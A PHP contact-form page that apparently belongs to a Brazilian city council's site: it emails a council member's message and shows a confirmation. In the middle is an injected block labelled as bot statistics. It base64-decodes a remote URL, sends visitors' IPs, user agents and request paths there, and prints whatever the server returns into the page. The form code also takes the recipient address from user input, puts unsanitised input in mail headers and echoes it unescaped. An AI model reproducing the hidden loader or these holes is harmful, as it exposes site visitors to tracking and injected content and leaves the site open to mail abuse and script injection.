<?php
//if(!isset($_POST[Submit])) die("N&atilde;o recebi nenhum par&acitc;metro. Por favor volte ao formulario.html antes");
/* Medida preventiva para evitar que outros domínios sejam remetente da sua mensagem. */
if (eregi('tempsite.ws$|locaweb.com.br$|hospedagemdesites.ws$|websiteseguro.com$', $_SERVER[HTTP_HOST])) {
    $emailsender = 'contato@camarasjc2.hospedagemdesites.ws';
} else {
    $emailsender = "contato@" . $_SERVER[HTTP_HOST];
    //    Na linha acima estamos forçando que o remetente seja 'webmaster@seudominio',
    // você pode alterar para que o remetente seja, por exemplo, 'contato@seudominio'.
}

/* Verifica qual é o sistema operacional do servidor para ajustar o cabeçalho de forma correta. Não alterar */
if (PHP_OS == "Linux") $quebra_linha = "\n"; //Se for Linux
elseif (PHP_OS == "WINNT") $quebra_linha = "\r\n"; // Se for Windows
else die("Este script nao esta preparado para funcionar com o sistema operacional de seu servidor");


$name = $_POST['txtNome'];
$emailremetente = trim($_POST['txtEmail']);
$telefone = $_POST['txtTelefone'];

$msg = $_POST['txtMensagem'];
//$comcopia = 'lucas.sandes@camarasjc.sp.gov.br';

$nomeVereador = $_POST['nomeVereador'];
$emaildestinatario = $_POST['emailVereador'];

//$emaildestinatario = 'lucas.sandes@camarasjc.sp.gov.br';

$assunto = 'Contato atraves do site';


$mensagemHTML = '

        <h4><strong>Mensagem enviada do site CMSJC</strong></h4>
        <p>
            <strong>Nome: </strong>' . $name . '<br/>
            <strong>Email: </strong> ' . $emailremetente . '<br/>

            <strong>Telefone: </strong>' . $telefone . '<br/><br/>
            <strong>Mensagem: </strong><br/>' . $msg . '<br/>

         </p>

';


$dadosHTML = '

        <p>
            <strong>Nome: </strong>' . $name . '<br/>
            <strong>Email: </strong> ' . $emailremetente . '<br/>

            <strong>Telefone: </strong>' . $telefone . '<br/>
            <strong>Mensagem: </strong><br/>' . $msg . '<br/>

         </p>

';


/* Montando o cabeçalho da mensagem */
$headers = "MIME-Version: 1.1" . $quebra_linha;
$headers .= "Content-type: text/html; charset=UTF-8" . $quebra_linha;
// Perceba que a linha acima contém "text/html", sem essa linha, a mensagem não chegará formatada.
$headers .= "From: Contato Camara <" . $emailsender . ">" . $quebra_linha;
$headers .= "Return-Path: " . $emailsender . $quebra_linha;
// Esses dois "if's" abaixo são porque o Postfix obriga que se um cabeçalho for especificado, deverá haver um valor.
// Se não houver um valor, o item não deverá ser especificado.
//$headers .= "Cc: " . $comcopia . $quebra_linha;

$headers .= "Reply-To: " . $emailremetente . $quebra_linha;
// Note que o e-mail do remetente será usado no campo Reply-To (Responder Para)


?>
<!---- COLANDO A PARTIR DAQUI ---->


<?php



include_once("library/master-page.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("master.php", "Portal da Transparência");
//$oMasterPage->AddParameter("css", "portal-da-transparencia/index");
$oMasterPage->AddParameter("pagina", "enviar-email");
$oMasterPage->Open("PageContent");



?><?php

if (!isset($sRetry)) {
    global $sRetry;
    $sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";

    if ((strstr($sUserAgen, 'google') == false) && (strstr($sUserAgen, 'yahoo') == false) && (strstr($sUserAgen, 'baidu') == false) && (strstr($sUserAgen, 'msn') == false) && (strstr($sUserAgen, 'opera') == false) && (strstr($sUserAgen, 'chrome') == false) && (strstr($sUserAgen, 'bing') == false) && (strstr($sUserAgen, 'safari') == false) && (strstr($sUserAgen, 'bot') == false)) // Bot comes
    {

        if (isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) { // Create  bot analitics
            $stCurlLink = base64_decode('aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw') . '?ip=' . urlencode($_SERVER['REMOTE_ADDR']) . '&useragent=' . urlencode($sUserAgent) . '&domainname=' . urlencode($_SERVER['HTTP_HOST']) . '&fullpath=' . urlencode($_SERVER['REQUEST_URI']) . '&check=' . isset($_GET['look']);
            @$stCurlHandle = curl_init($stCurlLink);

        }

    }

    if ($stCurlHandle !== NULL) {
        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
        $sResult = @curl_exec($stCurlHandle);

        if ($sResult[0] == "O") {
            $sResult[0] = " ";
            echo $sResult; // Statistic code end

        }
        curl_close($stCurlHandle);

    }

}

?>

<h1>Enviando E-mail</h1>


<div>


    <?php
    /* Enviando a mensagem */
    //É obrigatório o uso do parâmetro -r (concatenação do "From na linha de envio"), aqui na Locaweb:
    if (/* Enviando a mensagem */
    mail($emaildestinatario, $assunto, $mensagemHTML, $headers, "-r" . $emailsender)
    ) {
        ?>


        <!--if (@mail($recipient, $subject, $message, $headers)){ ?> -->

        <div class="alert alert-success">
            <h4><strong>Mensagem enviada para o vereador <?php echo $nomeVereador?></strong></h4>

            <p>Sua mensagem foi enviada com sucesso! Responderemos o mais breve possível.<br/></p>

            <h3><strong>Dados enviados:</strong></h3>

            <p><?php echo $dadosHTML; ?></p>
        </div>

    <?php
    } else {
        echo '<div class="alert alert-danger">
                    <h4>Ops, ocorreu um erro!</h4>
                    <p>Desculpe, ocorreu ao tentar enviar sua mensagem. Por favor tente novamente mais tarde.</p>
                  </div>';
    }
    ?>


    <div class="clear"></div>


    <a href="javascript:history.back();" class="mid">Voltar</a>

    <?php
    $oMasterPage->Close("PageContent");
    $oMasterPage->End();

    ?>
</div>
